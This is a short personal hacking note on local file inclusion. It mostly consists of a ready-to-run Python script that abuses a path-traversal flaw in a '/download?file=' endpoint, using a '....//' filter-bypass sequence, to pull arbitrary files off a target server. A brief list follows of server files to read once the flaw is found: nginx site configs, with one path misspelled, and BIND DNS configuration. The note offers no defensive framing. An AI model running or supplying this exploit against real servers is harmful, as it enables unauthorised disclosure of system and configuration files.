---
title: "Lfi (Web)"
category: "web"
subcategory: "lfi"
type: "technique"
tags: ["my-notes", "personal", "lfi", "nginx", "web"]
summary: "Personal note: Lfi (Web)."
source:
  name: "Personal notes"
origin_path: "Web/LFI.md"
---

## LFI Script to auto download files
```python
#!/usr/bin/env python3

import requests
import sys
import zipfile
import io

def download(file):
    url = f"<URL HERE>/download?file=....//....//....//....//....//....//....//{file}"
    r = requests.get(url)
    if len(r.content) == 0:
        return None
    zip_content = io.BytesIO(r.content)
    with zipfile.ZipFile(zip_content) as z:
        content = z.read(f"{file}")
    return content.decode()

file = download(sys.argv[1])
if file:
    print(file)
```

## Files to check for when having LFI
### nginx configs
```
/etc/ngnix/sites-enabled/default
```


### DNS records
```
/etc/bind/named.conf
```

```
/etc/bind/named.conf.local
```

---

*From your own notes: `Web/LFI.md`*
